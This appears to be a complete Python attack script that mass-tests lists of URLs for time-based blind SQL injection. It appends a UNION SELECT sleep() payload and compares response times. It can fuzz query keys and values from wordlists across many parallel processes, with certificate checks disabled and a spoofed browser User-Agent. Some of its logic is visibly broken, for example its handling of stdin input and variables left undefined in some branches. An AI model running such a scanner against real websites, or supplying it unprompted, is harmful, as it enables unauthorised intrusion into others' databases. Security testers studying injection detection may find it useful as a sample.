import requests, optparse, sys, multiprocessing
from math import fsum
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', action="store", dest="url", help='Base target uri (ex. http://target-uri/)')
    parser.add_option('-f', '--file', dest="file", help='example.txt')
    parser.add_option('-t', '--time', dest="time_to_sleep", type=int)
    parser.add_option('-c', '--concurrents', dest="threads", type=int,default=100)
    parser.add_option('-m', '--maxtimeout', dest="timeout", type=int,default=8)
    parser.add_option('-o', '--output', dest="output", type=str,default='resultsBlind.txt')
    parser.add_option('-k', '--keys', dest="file_to_fuzz_keys", type=str)
    parser.add_option('-p', '--payloads', dest="payloads_to_fuzz_values", type=str)


    options, args = parser.parse_args()

    if not options.url:
        print('[+] Specify an url')
        print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
        exit()
    if not options.time_to_sleep:
        print('[+] Specify a blind time based payload')
        print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
        exit()
    if not options.file:
        print('[+] Specify a file')
        print('[+] Example usage: exploit.py -f urls -u http://target-uri/ -t 10')
        exit()
    globals().update(locals())

def mesure_common_time_loading(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    try:
        r = requests.get(url,headers=headers,allow_redirects=False, verify=False,timeout=20)
    except requests.exceptions.ConnectionError:
        exit()
    return round(r.elapsed.total_seconds(),2)

def test_time_based_sql_blind(url,brute=False):
    #print('[DEBUG8] {}'.format(url))
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    if brute is False:
        url=url+'%27%20union%20select%201,2,sleep({})--+'.format(options.time_to_sleep)
    try:
        r = requests.get(url,headers=headers,allow_redirects=False, verify=False,timeout=20)
    except requests.exceptions.ConnectionError:
        exit()
    return round(r.elapsed.total_seconds(),2)

def check_sqli_time_based(url,brute=False):
    #print('[DEBUG6] {}'.format(url))
    first_elapsed_time = mesure_common_time_loading(url)
    if brute:
        blind_elapsed_time = test_time_based_sql_blind(url,brute=True)
    else:
        blind_elapsed_time = test_time_based_sql_blind(url,brute=False)
    second_elapsed_time = mesure_common_time_loading(url)
    average_common_elapsed_time = round((sum([first_elapsed_time+second_elapsed_time])/2),2)
    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep

    if rules_to_confirme_blind_sqli:
        print('[Blind Confirmed] {} / [Reqs] Average:{} Blinded:{}'.format(url,average_common_elapsed_time,blind_elapsed_time))
    else:
        print('[There isnt blind SQLI] {}'.format(url))

def url_mutation_querie_fuzz(url):
    #print('[DEBUG] {}'.format(url))
    if not url.startswith('http'):
        url='http://'+url
    if "?" in url:
        #print('[DEBUG1] {}'.format(url))
        query_strings = url.split('?')[1].split('&')
        for keypair in query_strings:
            #print('[KeyPair] {}'.format(keypair))
            key, value = keypair.split('=')
            #print('[Key] {} [Value] {}'.format(key,value))
            url_replaced = url.replace(value,'FUZZ')
            print('[Url_Generated] {}'.format(url_replaced))
            if options.file_to_fuzz_keys and options.payloads_to_fuzz_values:
                brute_url_mutation_querie_fuzz(url,key,value)
    else:
        #print('[DEBUG0] {}'.format(url))
        check_sqli_time_based(url,brute=False)
    if options.file_to_fuzz_keys and options.payloads_to_fuzz_values:
        #print('[DEBUG4] {}'.format(url))
        brute_url_mutation_querie_fuzz(url,key,value)

def brute_url_mutation_querie_fuzz(url,key,value):
    #print('[DEBUG3] {}'.format(url))
    if "?" in url:
        fuzz_keys_file = open(options.file_to_fuzz_keys)
        keys_words = map(str.strip, fuzz_keys_file.readlines())
        fuzz_values_file = open(options.payloads_to_fuzz_values)
        values_words = map(str.strip, fuzz_values_file.readlines())
        for key_word in keys_words:
            url_replaced_key = url.replace(key,key_word)
            print("[Url_with_key] {}".format(url_replaced_key))
            for value_word in values_words:
                url_replaced_value = url_replaced_key.replace(value,value_word)
                print("[Url_with_value] {}".format(url_replaced_value))
                check_sqli_time_based(url_replaced_value,brute=True)

    else:
        #print('[DEBUG10] {}'.format(url))
        url_replaced='{}?k_FUZZ=payload_SQLI'.format(url)
        print('cairiaaqui {}'.format(url))

def main():
    menu()
    if not sys.stdin.isatty():
        urls = sys.stdin.read()
    else:
        f = open(options.file)
        urls = map(str.strip, f.readlines())
    fire = multiprocessing.Pool(options.threads)
    try:
        fire.map(url_mutation_querie_fuzz, urls)
        fire.close()
        fire.join()
    except UnboundLocalError:
        pass
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
